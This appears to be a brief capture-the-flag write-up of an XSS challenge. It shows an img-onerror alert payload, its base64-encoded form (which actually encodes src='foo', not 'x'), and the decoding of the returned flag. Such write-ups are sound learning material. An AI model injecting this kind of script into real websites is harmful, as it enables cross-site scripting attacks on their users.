# 7 - now that's xss

That challange took me sometime, because it's my first succed xss

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/7/1.png)

That page looked like that

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/7/2.png)

and here was form for payload

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/7/3.png)

```
<img src="x" onerror = "alert(1)">
```

but encoded in base64

```
PGltZyBzcmM9ImZvbyIgb25lcnJvcj0iYWxlcnQoMSkiPg==
```

i've recieved that flag and decrypted that in python:

```
Flag: chr(84)||chr(86)||chr(78)||chr(73)||chr(85)||chr(70)||chr(57)||chr(55)||chr(81)||chr(71)||chr(89)||chr(107)||chr(81)||chr(69)||chr(119)||chr(122)||chr(78)||chr(69)||chr(100)||chr(107)||chr(83)||chr(68)||chr(70)||chr(53)||chr(99)||chr(107)||chr(108)||chr(52)||chr(102)||chr(81)||chr(61)||chr(61)
```

and then recieved flag base64 encoded so I've decoded it and reported it to the bot:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/7/4.png)